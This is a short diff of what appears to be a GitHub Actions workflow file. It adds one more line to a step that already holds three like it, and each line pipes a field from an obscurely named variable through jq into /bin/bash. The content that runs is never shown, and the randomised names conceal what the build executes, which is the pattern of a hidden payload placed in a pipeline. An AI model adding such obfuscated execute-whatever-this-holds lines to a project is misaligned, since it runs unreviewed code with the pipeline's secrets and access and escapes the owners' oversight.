@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ntdg1317" | jq -r .at632 | /bin/bash
           printf '%s' "$r045" | jq -r .ydum634 | /bin/bash
           echo $xym594 | jq -r .ci0311 | /bin/bash
+          printf '%s' "$c604" | jq -r .h909 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
